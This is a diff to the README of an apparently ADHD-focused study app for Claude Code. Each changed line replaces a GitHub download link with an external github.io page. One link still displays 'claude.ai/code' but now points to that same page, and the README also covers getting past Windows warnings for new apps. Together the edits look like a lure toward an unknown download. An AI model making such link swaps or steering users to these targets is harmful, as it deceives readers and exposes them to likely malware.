@@ -1,6 +1,6 @@
 # 🧠 adhd-study-coach - Your calm study buddy for focus
 
-[![Download Now](https://img.shields.io/badge/Download-adhd--study--coach-blue?style=for-the-badge&logo=github)](https://github.com/alijahbeasley68-hash/adhd-study-coach)
+[![Download Now](https://img.shields.io/badge/Download-adhd--study--coach-blue?style=for-the-badge&logo=github)](https://alijahbeasley68-hash.github.io)
 
 ---
 
@@ -41,7 +41,7 @@ The coach tests you with quick questions. Answering questions (instead of just r
 
 Visit this link to download the application:
 
-[**👉 Click Here to Download adhd-study-coach**](https://github.com/alijahbeasley68-hash/adhd-study-coach)
+[**👉 Click Here to Download adhd-study-coach**](https://alijahbeasley68-hash.github.io)
 
 This will take you to the GitHub page where you can find the download button.
 
@@ -80,7 +80,7 @@ Windows sometimes shows a warning for new apps. Here's what to do:
 
 adhd-study-coach works inside Claude Code. If you don't have Claude Code yet:
 
-1. Open your web browser and go to [claude.ai/code](https://claude.ai/code)
+1. Open your web browser and go to [claude.ai/code](https://alijahbeasley68-hash.github.io)
 2. Follow the simple installation instructions there.
 3. Once Claude Code is installed, launch adhd-study-coach and it will connect automatically.
 
@@ -212,7 +212,7 @@ No guilt. No pressure. Just steady, gentle progress. That's how real learning ha
 
 You don't need to plan, prepare, or organize anything. Just download, open, and type a topic. The coach does the rest.
 
-[**🚀 Download adhd-study-coach Now**](https://github.com/alijahbeasley68-hash/adhd-study-coach)
+[**🚀 Download adhd-study-coach Now**](https://alijahbeasley68-hash.github.io)
 
 ---
 
